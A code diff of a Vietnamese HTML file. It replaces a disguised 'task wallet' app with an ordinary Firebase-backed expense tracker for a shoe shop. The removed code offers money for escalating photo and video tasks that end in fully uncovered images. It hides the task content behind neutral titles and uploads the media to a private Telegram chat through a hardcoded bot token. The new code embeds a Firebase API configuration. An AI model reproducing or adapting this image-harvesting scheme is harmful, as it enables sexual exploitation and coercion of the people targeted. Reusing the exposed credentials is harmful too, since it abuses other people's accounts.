@@ -1,457 +1,513 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="vi" class="h-full bg-slate-50">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Hệ Thống Quản Lý</title>
-    <!-- SweetAlert2 for beautiful popups -->
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    <!-- FontAwesome for icons -->
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <title>Sổ Chi Tiêu & Phân Tích - Tiệm Giày Bình Dương</title>
     
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Chart.js for Analytics -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#4F46E5', // Indigo
+                        expense: '#F43F5E', // Rose
+                        profit: '#10B981',  // Emerald
+                    }
+                }
+            }
+        }
+    </script>
     <style>
-        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
-        
-        /* App Container for Mobile View */
-        body { 
-            background-color: #f4f6f9; /* Corporate light gray */
-            color: #333; 
-            padding-bottom: 50px; 
-            display: flex;
-            justify-content: center;
-        }
-        .app-container {
-            width: 100%;
-            max-width: 480px; /* Lock width to look like an app on PC */
-            background-color: #f4f6f9;
-            min-height: 100vh;
-            user-select: none; /* Prevent text selection */
-            -webkit-user-select: none;
-            box-shadow: 0 0 20px rgba(0,0,0,0.1);
-        }
-        
-        /* Wallet Section - Corporate Blue */
-        .wallet-card { background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color: white; margin: 20px; padding: 25px 20px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0, 198, 255, 0.3); text-align: center; position: relative; }
-        .wallet-title { font-size: 14px; opacity: 0.9; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }
-        .wallet-balance { font-size: 32px; font-weight: bold; margin-bottom: 15px; }
-        .btn-withdraw { background: white; color: #007bff; border: none; padding: 10px 25px; border-radius: 30px; font-weight: bold; font-size: 16px; width: 100%; box-shadow: 0 4px 10px rgba(0,0,0,0.1); cursor: pointer; transition: transform 0.1s;}
-        .btn-withdraw:active { transform: scale(0.95); }
-        
-        /* Cooldown Alert */
-        .cooldown-alert { background: #e9ecef; color: #495057; margin: 0 20px 20px; padding: 20px 15px; border-radius: 15px; font-size: 15px; text-align: center; font-weight: 500; display: none; border: 1px solid #ced4da;}
-        .countdown-clock { font-size: 36px; font-weight: 900; margin-top: 10px; letter-spacing: 2px; font-family: 'Courier New', Courier, monospace; color: #007bff;}
-        
-        /* Task List */
-        .task-container { display: none; margin: 0 20px; }
-        .task-container.active { display: block; }
-        .task-card { background: white; padding: 15px; border-radius: 15px; margin-bottom: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); display: flex; justify-content: space-between; align-items: center; border-left: 5px solid #007bff; }
-        .task-info { flex: 1; padding-right: 15px; }
-        .task-desc { font-size: 15px; line-height: 1.4; color: #444; }
-        .task-reward { color: #007bff; font-weight: bold; font-size: 14px; margin-top: 5px; display: inline-block; background: #e7f1ff; padding: 3px 10px; border-radius: 10px; }
-        .btn-accept { background: #007bff; color: white; border: none; padding: 8px 15px; border-radius: 10px; font-weight: bold; font-size: 14px; white-space: nowrap; cursor: pointer; transition: transform 0.1s;}
-        .btn-accept:active { transform: scale(0.95); }
-
-        /* Current Task Section */
-        .current-task-section { display: none; margin: 20px; }
-        .current-task-card { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0, 123, 255, 0.1); text-align: center; border: 2px dashed #007bff; }
-        .current-task-card h3 { color: #007bff; margin-bottom: 15px; font-size: 18px; }
-        
-        .current-task-desc { font-size: 18px; color: #333; margin-bottom: 20px; font-weight: 500; }
-        .btn-complete { background: #28a745; color: white; border: none; padding: 12px 0; border-radius: 15px; font-weight: bold; font-size: 16px; width: 100%; margin-bottom: 10px; cursor: pointer;}
-        .btn-change { background: #f8f9fa; color: #6c757d; border: none; padding: 12px 0; border-radius: 15px; font-weight: bold; font-size: 16px; width: 100%; cursor: pointer;}
-        
-        /* Footer Slogan */
-        .footer-slogan { text-align: center; color: #a0aabf; font-size: 13px; margin-top: 20px; padding-bottom: 20px; font-weight: bold; letter-spacing: 1px; text-transform: uppercase;}
-        .footer-slogan i { margin: 0 5px; color: #007bff; }
-        
-        /* Message Section */
-        .message-section { margin: 0 20px 20px; }
-        .message-card { background: white; padding: 15px; border-radius: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); border-left: 5px solid #007bff; }
-        .message-title { font-weight: bold; color: #333; margin-bottom: 10px; font-size: 15px; display: flex; align-items: center; gap: 8px;}
-        .message-title i { color: #007bff; }
-        #quickMessage { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #ced4da; font-size: 14px; margin-bottom: 10px; resize: vertical; min-height: 80px; outline: none; font-family: inherit;}
-        #quickMessage:focus { border-color: #007bff; }
-        .btn-send-msg { background: #007bff; color: white; border: none; padding: 10px 15px; border-radius: 10px; font-weight: bold; font-size: 14px; width: 100%; cursor: pointer; transition: transform 0.1s; }
-        .btn-send-msg:active { transform: scale(0.95); }
+        .no-scrollbar::-webkit-scrollbar { display: none; }
+        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
     </style>
 </head>
-<body>
-    <div class="app-container">
-        <div class="wallet-card">
-            <div class="wallet-title"><i class="fas fa-credit-card"></i> Ví tiền hiện có</div>
-            <div class="wallet-balance" id="balanceDisplay">... VNĐ</div>
-            <button class="btn-withdraw" onclick="withdrawMoney()"><i class="fas fa-money-bill-transfer"></i> Rút tiền hiện có</button>
-        </div>
+<body class="h-full flex flex-col overflow-hidden text-slate-800 font-sans">
 
-        <div class="cooldown-alert" id="cooldownAlert">
-            <i class="fas fa-clock"></i> Vui lòng đợi đến lần nhận nhiệm vụ tiếp theo:
-            <div class="countdown-clock" id="countdownTimer">12:00:00</div>
+    <!-- TOP HEADER (Compact) -->
+    <header class="bg-slate-900 text-white px-4 py-3 flex items-center justify-between shrink-0 shadow-md z-10 relative">
+        <div class="flex items-center space-x-2.5">
+            <div class="w-8 h-8 bg-rose-500 rounded-lg flex items-center justify-center text-white shadow-lg">
+                <i data-lucide="pie-chart" class="w-4 h-4"></i>
+            </div>
+            <div>
+                <h1 class="text-sm font-bold tracking-wide">Sổ Chi Tiêu & Dòng Tiền</h1>
+                <p class="text-[10px] text-rose-200">Đồng bộ Firebase Realtime</p>
+            </div>
         </div>
+        
+        <button onclick="loadAllData()" class="p-2 bg-slate-800 hover:bg-slate-700 rounded-lg border border-slate-700 text-white transition flex items-center justify-center group" title="Làm mới">
+            <i data-lucide="refresh-cw" class="w-4 h-4 group-hover:rotate-180 transition-transform duration-500"></i>
+        </button>
+    </header>
 
-        <div class="current-task-section" id="currentTaskSection">
-            <div class="current-task-card">
-                <h3><i class="fas fa-heart"></i> Nhiệm vụ đang làm</h3>
-                <div class="current-task-desc" id="currentTaskDesc">...</div>
-                <div class="task-reward" id="currentTaskReward" style="margin-bottom: 20px; font-size: 16px;">...</div>
+    <!-- TOAST NOTIFICATION CONTAINER -->
+    <div id="toast-container" class="fixed top-4 right-4 z-50 flex flex-col space-y-2 pointer-events-none"></div>
+
+    <!-- MAIN DASHBOARD -->
+    <main class="flex-1 overflow-y-auto p-3 space-y-4 bg-slate-50">
+
+        <!-- THỐNG KÊ GỘP CHUNG MỚI -->
+        <div class="grid grid-cols-2 gap-3">
+            
+            <!-- CỘT 1: HÔM NAY -->
+            <div class="bg-white rounded-xl p-3 border border-slate-100 shadow-sm relative overflow-hidden flex flex-col space-y-3">
+                <div class="border-b border-slate-100 pb-1.5">
+                    <p class="text-[10px] text-slate-400 font-bold uppercase tracking-wider">Hôm Nay</p>
+                </div>
                 
-                <!-- File Upload Hidden Input -->
-                <input type="file" id="mediaUpload" accept="image/*,video/*" style="display: none;">
-                <button class="btn-change" id="btnSelectMedia" onclick="document.getElementById('mediaUpload').click()" style="margin-bottom: 10px; background: #e7f1ff; color: #007bff; border: 1px dashed #007bff;">
-                    <i class="fas fa-camera"></i> Đính kèm Ảnh / Video
-                </button>
-                <div id="mediaPreviewName" style="font-size: 14px; color: #007bff; margin-bottom: 15px; display: none; font-weight: bold;"></div>
+                <div>
+                    <p class="text-[10px] text-emerald-600 font-bold">Lãi:</p>
+                    <h3 id="card-profit-day" class="text-base font-black text-emerald-600 leading-none mt-0.5 truncate">0đ</h3>
+                </div>
+                
+                <div>
+                    <p class="text-[10px] text-rose-600 font-bold">Chi:</p>
+                    <h3 id="card-expense-day" class="text-base font-black text-rose-600 leading-none mt-0.5 truncate">0đ</h3>
+                </div>
 
-                <button class="btn-complete" onclick="completeTask()"><i class="fas fa-check"></i> Gửi & Hoàn thành</button>
-                <button class="btn-change" onclick="changeTask()"><i class="fas fa-sync"></i> Hủy & Chọn nhiệm vụ khác</button>
+                <div class="pt-2 border-t border-slate-100">
+                    <p class="text-[10px] text-slate-500 font-bold">Tồn Quỹ Ngày:</p>
+                    <h3 id="card-balance-day" class="text-sm font-black text-slate-800 mt-0.5 truncate">0đ</h3>
+                </div>
+            </div>
+
+            <!-- CỘT 2: THÁNG NÀY -->
+            <div class="bg-white rounded-xl p-3 border border-slate-100 shadow-sm relative overflow-hidden flex flex-col space-y-3">
+                 <div class="border-b border-slate-100 pb-1.5">
+                    <p class="text-[10px] text-indigo-500 font-bold uppercase tracking-wider">Tháng Này</p>
+                </div>
+                
+                <div>
+                    <p class="text-[10px] text-emerald-600 font-bold">Lãi:</p>
+                    <h3 id="card-profit-month" class="text-base font-black text-emerald-600 leading-none mt-0.5 truncate">0đ</h3>
+                </div>
+                
+                <div>
+                    <p class="text-[10px] text-rose-600 font-bold">Chi:</p>
+                    <h3 id="card-expense-month" class="text-base font-black text-rose-600 leading-none mt-0.5 truncate">0đ</h3>
+                </div>
+
+                <div class="pt-2 border-t border-slate-100">
+                    <p class="text-[10px] text-indigo-600 font-bold">Tồn Quỹ Tháng:</p>
+                    <h3 id="card-balance-month" class="text-sm font-black text-indigo-700 mt-0.5 truncate">0đ</h3>
+                </div>
+            </div>
+
+            <!-- TỔNG KẾT TẤT CẢ -->
+            <div class="col-span-2 bg-gradient-to-r from-slate-800 to-slate-900 rounded-xl p-4 shadow-md relative overflow-hidden text-white flex justify-between items-center">
+                <div>
+                    <p class="text-[10px] text-slate-300 font-bold uppercase tracking-wider">TỔNG TỒN QUỸ (Tất Cả)</p>
+                    <h3 id="card-balance-all" class="text-2xl font-black mt-0.5 truncate text-white">0đ</h3>
+                </div>
+                <div class="p-2 bg-slate-700 rounded-full bg-opacity-50 shrink-0">
+                    <i data-lucide="vault" class="w-6 h-6 text-white"></i>
+                </div>
             </div>
         </div>
 
-        <div id="taskListSection">
-            <div id="task-list" class="task-container active"></div>
+        <!-- ADD EXPENSE FORM (Compact) -->
+        <div class="bg-white rounded-xl p-4 border border-slate-100 shadow-sm">
+            <div class="flex items-center space-x-1.5 border-b border-slate-100 pb-2 mb-3 text-rose-600">
+                <i data-lucide="receipt" class="w-4 h-4"></i>
+                <h2 class="text-sm font-bold text-slate-900">Ghi Chép Chi Tiêu</h2>
+            </div>
+            
+            <form onsubmit="submitExpense(event)" class="space-y-3">
+                <!-- Dropdown Chọn Nhanh -->
+                <div>
+                    <select id="expense-category" onchange="toggleOtherInput()" required class="w-full px-3 py-2 bg-slate-50 border border-slate-200 rounded-lg text-sm focus:outline-none focus:ring-1 focus:ring-rose-500 font-bold text-slate-700">
+                        <option value="" disabled selected>Chọn mục đích chi...</option>
+                        <option value="Ăn uống">Ăn uống 🍔</option>
+                        <option value="Mua đồ">Mua sắm 🛍️</option>
+                        <option value="Bé <3">Bé <3 👶</option>
+                        <option value="Pet">Thú cưng 🐶</option>
+                        <option value="Sức khỏe">Sức khỏe 💊</option>
+                        <option value="Du lịch">Du lịch ✈️</option>
+                        <option value="App">App / Dịch vụ 📱</option>
+                        <option value="Khác">Khác...</option>
+                    </select>
+                    <!-- Input hiển thị khi chọn Khác -->
+                    <input type="text" id="expense-other" placeholder="Nhập mục đích khác..." class="hidden w-full px-3 py-2 mt-2 bg-slate-50 border border-slate-200 rounded-lg text-sm focus:outline-none focus:ring-1 focus:ring-rose-500 text-slate-700">
+                </div>
+                
+                <div class="flex space-x-2">
+                    <input type="text" id="expense-amount" required placeholder="Số tiền (Vd: 50)" onblur="handlePriceBlur(this)" class="w-full px-3 py-2 bg-slate-50 border border-slate-200 rounded-lg text-sm focus:outline-none focus:ring-1 focus:ring-rose-500 font-bold text-rose-600">
+                    
+                    <button type="submit" id="btn-submit-expense" class="shrink-0 px-4 bg-rose-500 hover:bg-rose-600 text-white rounded-lg font-bold shadow-sm transition duration-300 flex items-center justify-center space-x-1">
+                        <i data-lucide="plus-circle" class="w-4 h-4"></i>
+                        <span>Lưu</span>
+                    </button>
+                </div>
+            </form>
         </div>
-        
-        <!-- Tin nhắn nhanh -->
-        <div class="message-section">
-            <div class="message-card">
-                <div class="message-title"><i class="fas fa-comment-dots"></i> Gửi tin nhắn nhanh</div>
-                <textarea id="quickMessage" placeholder="Nhập lời nhắn gửi đến tôi..."></textarea>
-                <button class="btn-send-msg" onclick="sendQuickMessage()"><i class="fas fa-paper-plane"></i> Gửi tin nhắn</button>
+
+        <!-- ANALYTICS CHART (Smaller height) -->
+        <div class="bg-white rounded-xl p-4 border border-slate-100 shadow-sm">
+            <div class="flex items-center space-x-1.5 border-b border-slate-100 pb-2 mb-3 text-indigo-600">
+                <i data-lucide="bar-chart-2" class="w-4 h-4"></i>
+                <h2 class="text-sm font-bold text-slate-900">Biểu Đồ Tài Chính</h2>
+            </div>
+            <div class="relative w-full h-[180px] flex items-center justify-center">
+                <canvas id="financeChart"></canvas>
             </div>
         </div>
 
-        <!-- Slogan -->
-        <div class="footer-slogan">
-            <i class="fas fa-shield-alt"></i> APP NHIỆM VỤ AN TOÀN BẢO MẬT GỬI QUA TELEGRAM <i class="fab fa-telegram-plane"></i>
+        <!-- EXPENSE HISTORY (List View) -->
+        <div class="bg-white rounded-xl border border-slate-100 shadow-sm overflow-hidden mb-6">
+            <div class="p-3 bg-slate-50 border-b border-slate-100 flex items-center justify-between text-slate-600">
+                <div class="flex items-center space-x-1.5">
+                    <i data-lucide="list" class="w-4 h-4"></i>
+                    <h2 class="text-sm font-bold text-slate-900">Lịch Sử Chi Tiêu</h2>
+                </div>
+                <span class="text-[10px] text-slate-400 font-medium">Tất cả thời gian</span>
+            </div>
+            
+            <div id="expense-list-container" class="divide-y divide-slate-100">
+                <div class="p-6 text-center text-xs text-slate-400">Đang tải dữ liệu...</div>
+            </div>
         </div>
-    </div>
 
+    </main>
+
+    <!-- FIREBASE SDK & MODULE INITIALIZATION -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+        import { getFirestore, collection, getDocs, doc, deleteDoc, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAWRBa3-QI8QG6kfP2J_qzgbpDz2_GJPp8",
+            authDomain: "doanhthu-73ade.firebaseapp.com",
+            projectId: "doanhthu-73ade",
+            storageBucket: "doanhthu-73ade.firebasestorage.app",
+            messagingSenderId: "449682329782",
+            appId: "1:449682329782:web:94974d346a4b49f8651617"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        window.firebaseDb = db;
+        window.fbGetDocs = getDocs;
+        window.fbCollection = collection;
+        window.fbDoc = doc;
+        window.fbDeleteDoc = deleteDoc;
+        window.fbAddDoc = addDoc;
+
+        window.onload = () => {
+            lucide.createIcons();
+            window.loadAllData();
+        };
+    </script>
+
+    <!-- CORE LOGIC & CHART SCRIPT -->
     <script>
-        // CẤU HÌNH TELEGRAM CỦA BẠN
-        const TELEGRAM_BOT_TOKEN = '8741437914:AAHZjk0SvWDeaAK3D8DPgp0Uke08ZVNd_g4';
-        const TELEGRAM_CHAT_ID = '8511070091';
+        let revenueRecords = [];
+        let expenseRecords = [];
+        let financeChart = null;
 
-        // Hàm gửi tin nhắn văn bản (chỉ text)
-        function sendTelegramText(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
-            }).catch(err => console.error(err));
-        }
-
-        // Dữ liệu thử thách (Tiêu đề ngụy trang chuyên nghiệp)
-        const tasks = [
-            { title: 'Nhiệm vụ số 1', desc: 'Chụp ảnh selfie.', reward: 25000 },
-            { title: 'Nhiệm vụ số 2', desc: 'Chụp ảnh lấp ló.', reward: 50000 },
-            { title: 'Nhiệm vụ số 3', desc: 'Quay clip ngắn lấp ló.', reward: 50000 },
-            { title: 'Nhiệm vụ số 4', desc: 'Quay clip hoặc chụp ảnh full không che.', reward: 200000 }
-        ];
-
-        // Khởi tạo ví: Nếu chưa từng có dữ liệu thì cho sẵn 100k
-        let storedBalance = localStorage.getItem('loveWalletBalance');
-        let balance = storedBalance !== null ? parseInt(storedBalance) : 100000;
-        
-        // Tự động chuyển đổi nếu người dùng đang dùng số nhỏ (ví dụ 100) -> 100.000
-        if (balance > 0 && balance < 1000) { 
-            balance = balance * 1000; 
-            localStorage.setItem('loveWalletBalance', balance); 
-        }
-
-        let currentTask = JSON.parse(localStorage.getItem('currentTask'));
-        let clockInterval;
-
-        // Xử lý sự kiện khi chọn file
-        document.getElementById('mediaUpload').addEventListener('change', function(e) {
-            const fileName = e.target.files[0]?.name;
-            if (fileName) {
-                const preview = document.getElementById('mediaPreviewName');
-                preview.innerText = `Đã đính kèm: ${fileName}`;
-                preview.style.display = 'block';
+        function handlePriceBlur(input) {
+            let val = parseInt(input.value) || 0;
+            if (val > 0 && val < 10000) {
+                input.value = val * 1000;
             }
-        });
-
-        // Cập nhật giao diện lúc mở app
-        function initApp() {
-            if (storedBalance === null) {
-                localStorage.setItem('loveWalletBalance', balance);
-            }
-            document.getElementById('balanceDisplay').innerText = balance.toLocaleString('vi-VN') + ' VNĐ';
-            renderTasks();
-            checkCurrentTask();
-            checkCooldownUI();
         }
 
-        function renderTasks() {
-            const container = document.getElementById('task-list');
-            container.innerHTML = '';
-            tasks.forEach(task => {
-                container.innerHTML += `
-                    <div class="task-card">
-                        <div class="task-info">
-                            <div class="task-desc" style="font-weight: bold;">${task.title}</div>
-                            <div class="task-reward">${task.reward.toLocaleString('vi-VN')} VNĐ</div>
-                        </div>
-                        <button class="btn-accept" onclick="acceptTask('${task.title}', '${task.desc}', ${task.reward})">Nhận</button>
+        function toggleOtherInput() {
+            const cat = document.getElementById('expense-category').value;
+            const otherInp = document.getElementById('expense-other');
+            if (cat === 'Khác') {
+                otherInp.classList.remove('hidden');
+                otherInp.setAttribute('required', 'true');
+                otherInp.focus();
+            } else {
+                otherInp.classList.add('hidden');
+                otherInp.removeAttribute('required');
+            }
+        }
+
+        window.loadAllData = async function() {
+            if (!window.firebaseDb) {
+                setTimeout(window.loadAllData, 500); 
+                return;
+            }
+
+            try {
+                // Fetch Doanh Thu
+                const revSnapshot = await window.fbGetDocs(window.fbCollection(window.firebaseDb, "doanhthu"));
+                revenueRecords = [];
+                revSnapshot.forEach((docSnap) => {
+                    revenueRecords.push({ id: docSnap.id, ...docSnap.data() });
+                });
+
+                // Fetch Chi Tiêu
+                const expSnapshot = await window.fbGetDocs(window.fbCollection(window.firebaseDb, "chitieu"));
+                expenseRecords = [];
+                expSnapshot.forEach((docSnap) => {
+                    expenseRecords.push({ id: docSnap.id, ...docSnap.data() });
+                });
+
+                // Sort Lịch sử giảm dần
+                expenseRecords.sort((a, b) => new Date(b.thoiGian) - new Date(a.thoiGian));
+
+                updateUI();
+            } catch (err) {
+                console.error(err);
+                showToast("Lỗi đồng bộ Firebase", "danger");
+            }
+        }
+
+        function updateUI() {
+            const now = new Date();
+            const todayStr = now.toDateString();
+            const currentMonth = now.getMonth();
+            const currentYear = now.getFullYear();
+
+            // Khởi tạo các biến chứa dữ liệu
+            let stats = {
+                day: { profit: 0, expense: 0, balance: 0 },
+                month: { profit: 0, expense: 0, balance: 0 },
+                all: { profit: 0, expense: 0, balance: 0 }
+            };
+
+            // Quét 1 lượt Doanh Thu
+            revenueRecords.forEach(r => {
+                let p = (Number(r.giaBan) || 0) - (Number(r.giaVon) || 0);
+                let d = new Date(r.thoiGian);
+                
+                stats.all.profit += p;
+                if (d.getMonth() === currentMonth && d.getFullYear() === currentYear) {
+                    stats.month.profit += p;
+                }
+                if (d.toDateString() === todayStr) {
+                    stats.day.profit += p;
+                }
+            });
+
+            // Quét 1 lượt Chi Tiêu
+            expenseRecords.forEach(e => {
+                let cost = Number(e.soTien) || 0;
+                let d = new Date(e.thoiGian);
+                
+                stats.all.expense += cost;
+                if (d.getMonth() === currentMonth && d.getFullYear() === currentYear) {
+                    stats.month.expense += cost;
+                }
+                if (d.toDateString() === todayStr) {
+                    stats.day.expense += cost;
+                }
+            });
+
+            // Tính tồn quỹ
+            stats.day.balance = stats.day.profit - stats.day.expense;
+            stats.month.balance = stats.month.profit - stats.month.expense;
+            stats.all.balance = stats.all.profit - stats.all.expense;
+
+            // Render Lên Giao Diện (Thẻ)
+            document.getElementById('card-profit-day').innerText = formatMoney(stats.day.profit);
+            document.getElementById('card-expense-day').innerText = formatMoney(stats.day.expense);
+            document.getElementById('card-balance-day').innerText = formatMoney(stats.day.balance);
+
+            document.getElementById('card-profit-month').innerText = formatMoney(stats.month.profit);
+            document.getElementById('card-expense-month').innerText = formatMoney(stats.month.expense);
+            document.getElementById('card-balance-month').innerText = formatMoney(stats.month.balance);
+
+            document.getElementById('card-balance-all').innerText = formatMoney(stats.all.balance);
+
+            // Cảnh báo màu đỏ nếu âm
+            ['day', 'month'].forEach(t => {
+                let el = document.getElementById(`card-balance-${t}`);
+                if (stats[t].balance < 0) { el.classList.add('text-rose-600'); el.classList.remove('text-slate-800', 'text-indigo-700'); }
+                else { el.classList.remove('text-rose-600'); if(t==='day') el.classList.add('text-slate-800'); else el.classList.add('text-indigo-700'); }
+            });
+            
+            let elAll = document.getElementById('card-balance-all');
+            if(stats.all.balance < 0) { elAll.classList.add('text-rose-300'); elAll.classList.remove('text-white'); }
+            else { elAll.classList.remove('text-rose-300'); elAll.classList.add('text-white'); }
+
+
+            // Vẽ Biểu Đồ So Sánh (Tháng Này vs Tất Cả)
+            renderChart(stats);
+
+            // Cập nhật Danh sách lịch sử chi (Mặc định hiện tất cả)
+            const listContainer = document.getElementById('expense-list-container');
+            listContainer.innerHTML = "";
+            
+            if (expenseRecords.length === 0) {
+                listContainer.innerHTML = `<div class="p-6 text-center text-xs text-slate-400">Chưa có khoản chi nào được ghi nhận.</div>`;
+                return;
+            }
+
+            expenseRecords.forEach(item => {
+                const div = document.createElement('div');
+                div.className = "p-3 flex items-center justify-between hover:bg-slate-50 transition";
+                div.innerHTML = `
+                    <div class="overflow-hidden pr-2">
+                        <div class="font-bold text-slate-900 text-sm truncate">${item.tenChiTieu}</div>
+                        <div class="text-[10px] text-slate-400 mt-0.5">${formatDate(item.thoiGian)}</div>
+                    </div>
+                    <div class="flex items-center space-x-2 shrink-0">
+                        <div class="font-black text-rose-600 text-sm">-${formatMoney(item.soTien)}</div>
+                        <button onclick="deleteExpenseRecord('${item.id}')" class="p-1.5 bg-slate-100 hover:bg-red-50 text-slate-400 hover:text-red-600 rounded-md transition" title="Xóa khoản này">
+                            <i data-lucide="trash-2" class="w-4 h-4"></i>
+                        </button>
                     </div>
                 `;
+                listContainer.appendChild(div);
             });
+            lucide.createIcons();
         }
 
-        // Kiểm tra thời gian 12h
-        function canTakeTask() {
-            let lastDoneTime = localStorage.getItem('lastDoneTime');
-            if (lastDoneTime) {
-                let timePassed = Date.now() - parseInt(lastDoneTime);
-                let hours12 = 12 * 60 * 60 * 1000;
-                if (timePassed < hours12) {
-                    Swal.fire('Chưa đến giờ', `Bạn cần đợi hết thời gian hiển thị trên đồng hồ để nhận nhiệm vụ mới.`, 'warning');
-                    return false;
-                }
-            }
-            return true;
-        }
-
-        // Nhận nhiệm vụ
-        function acceptTask(title, desc, reward) {
-            if (!canTakeTask()) return;
-
-            Swal.fire({
-                title: 'Chi tiết nhiệm vụ:',
-                html: `<div style="font-size: 18px; padding: 15px; color: #007bff; font-weight: bold; background: #e7f1ff; border-radius: 10px; margin-bottom: 10px;">${desc}</div><span style="font-size: 14px; color: #555;">Xác nhận nhận nhiệm vụ này?</span>`,
-                icon: 'question',
-                showCancelButton: true,
-                confirmButtonText: 'Nhận luôn',
-                cancelButtonText: 'Đóng',
-                confirmButtonColor: '#007bff'
-            }).then((result) => {
-                if (result.isConfirmed) {
-                    currentTask = { title, desc, reward };
-                    localStorage.setItem('currentTask', JSON.stringify(currentTask));
-                    
-                    sendTelegramText(`🔥 <b>NHẬN NHIỆM VỤ!</b>\n\n📌 <b>Tên:</b> ${title}\n📝 <b>Nội dung:</b> ${desc}\n💰 <b>Thưởng:</b> ${reward.toLocaleString('vi-VN')} VNĐ`);
-
-                    checkCurrentTask();
-                    checkCooldownUI();
-                    Swal.fire('Thành công', 'Đã nhận nhiệm vụ. Hãy hoàn thành nhé!', 'success');
-                }
-            });
-        }
-
-        function checkCurrentTask() {
-            const listSection = document.getElementById('taskListSection');
-            const currentSection = document.getElementById('currentTaskSection');
+        // Vẽ biểu đồ so sánh: Tháng này vs Tổng cộng
+        function renderChart(stats) {
+            const ctx = document.getElementById('financeChart').getContext('2d');
             
-            // Nếu có nhiệm vụ đang làm VÀ chưa bị cooldown khóa
-            let isCooldown = false;
-            let lastDoneTime = localStorage.getItem('lastDoneTime');
-            if (lastDoneTime && (Date.now() - parseInt(lastDoneTime)) < (12 * 60 * 60 * 1000)) {
-                isCooldown = true;
-            }
+            if (financeChart) financeChart.destroy();
 
-            if (isCooldown) {
-                listSection.style.display = 'none';
-                currentSection.style.display = 'none';
-            } else if (currentTask) {
-                listSection.style.display = 'none';
-                currentSection.style.display = 'block';
-                
-                const descEl = document.getElementById('currentTaskDesc');
-                descEl.innerText = currentTask.desc;
-                
-                document.getElementById('currentTaskReward').innerText = currentTask.reward.toLocaleString('vi-VN') + ' VNĐ';
-            } else {
-                listSection.style.display = 'block';
-                currentSection.style.display = 'none';
-            }
-        }
-
-        function changeTask() {
-            currentTask = null;
-            localStorage.removeItem('currentTask');
-            document.getElementById('mediaUpload').value = '';
-            document.getElementById('mediaPreviewName').style.display = 'none';
-            checkCurrentTask();
-        }
-
-        // Báo cáo hoàn thành (Gửi Media thẳng lên Telegram)
-        function completeTask() {
-            const fileInput = document.getElementById('mediaUpload');
-            const file = fileInput.files[0];
-
-            if (!file) {
-                Swal.fire('Thiếu minh chứng', 'Vui lòng đính kèm ảnh hoặc video trước khi hoàn thành.', 'warning');
-                return;
-            }
-
-            Swal.fire({
-                title: 'Đang gửi...',
-                text: 'Vui lòng chờ một chút nhé...',
-                allowOutsideClick: false,
-                didOpen: () => {
-                    Swal.showLoading();
-                }
-            });
-
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT_ID);
-            
-            // Nhận diện Ảnh hay Video
-            let endpoint = 'sendPhoto';
-            let mediaField = 'photo';
-            if (file.type.startsWith('video/')) {
-                endpoint = 'sendVideo';
-                mediaField = 'video';
-            }
-            
-            formData.append(mediaField, file);
-            formData.append('caption', `✅ <b>ĐÃ HOÀN THÀNH!</b>\n\n📌 <b>Nội dung:</b> ${currentTask.desc}\n💵 <b>Đã cộng:</b> ${currentTask.reward.toLocaleString('vi-VN')} VNĐ`);
-            formData.append('parse_mode', 'HTML');
-
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${endpoint}`;
-
-            fetch(url, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    balance += currentTask.reward;
-                    localStorage.setItem('loveWalletBalance', balance);
-                    localStorage.setItem('lastDoneTime', Date.now()); 
-                    
-                    document.getElementById('balanceDisplay').innerText = balance.toLocaleString('vi-VN') + ' VNĐ';
-                    
-                    currentTask = null;
-                    localStorage.removeItem('currentTask');
-                    
-                    fileInput.value = '';
-                    document.getElementById('mediaPreviewName').style.display = 'none';
-
-                    checkCurrentTask();
-                    checkCooldownUI();
-                    Swal.fire('Thành công!', 'Đã gửi minh chứng và cộng tiền vào ví.', 'success');
-                } else {
-                    Swal.fire('File quá lớn', 'Tệp đính kèm vượt quá 50MB. Vui lòng quay video ngắn hơn.', 'error');
-                }
-            })
-            .catch(err => {
-                console.error(err);
-                Swal.fire('Lỗi mạng', 'Không thể kết nối, vui lòng kiểm tra lại mạng.', 'error');
-            });
-        }
-
-        // Rút tiền
-        function withdrawMoney() {
-            if (balance <= 0) {
-                Swal.fire('Ví rỗng', 'Bạn chưa có tiền trong ví.', 'error');
-                return;
-            }
-
-            Swal.fire({
-                title: 'Xác nhận rút tiền?',
-                text: `Bạn muốn rút ${balance.toLocaleString('vi-VN')} VNĐ?`,
-                icon: 'question',
-                showCancelButton: true,
-                confirmButtonText: 'Rút luôn',
